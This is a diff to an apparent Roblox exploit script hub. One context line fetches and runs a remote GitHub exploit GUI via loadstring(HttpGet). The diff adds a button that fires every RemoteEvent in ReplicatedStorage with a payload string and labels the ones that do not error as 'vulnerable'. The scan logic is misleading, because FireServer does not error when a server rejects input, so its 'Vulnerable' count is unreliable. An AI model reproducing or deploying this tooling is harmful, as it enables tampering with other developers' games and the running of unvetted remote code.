@@ -431,3 +431,36 @@ local Button = MainTab:CreateButton({
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
    end,
 })
+
+local Button = Tab:CreateButton({
+   Name = "Vulnerable RemoteEvent scanner (results in console)",
+   Callback = function()
+   local player = game:GetService("Players").LocalPlayer
+local rs = game:GetService("ReplicatedStorage")
+local total = 0
+local hits = 0
+
+print("\n=== RemoteEvent Scanner (ReplicatedStorage) ===\n")
+
+for _, obj in ipairs(rs:GetDescendants()) do
+    if obj:IsA("RemoteEvent") then
+        total += 1
+        local success, err = pcall(function()
+            obj:FireServer("003nm4_payload_test", player)
+        end)
+        if success then
+            hits += 1
+            print("[✔] Payload accepted by:", obj:GetFullName())
+        else
+            print("[✘] Rejected or errored:", obj:GetFullName())
+        end
+    end
+end
+
+print("\n=== Scan Complete ===")
+print("Scanned:", total)
+print("Vulnerable:", hits)
+print("Secure/Unhandled:", total - hits)
+print("======================\n")
+   end,
+})
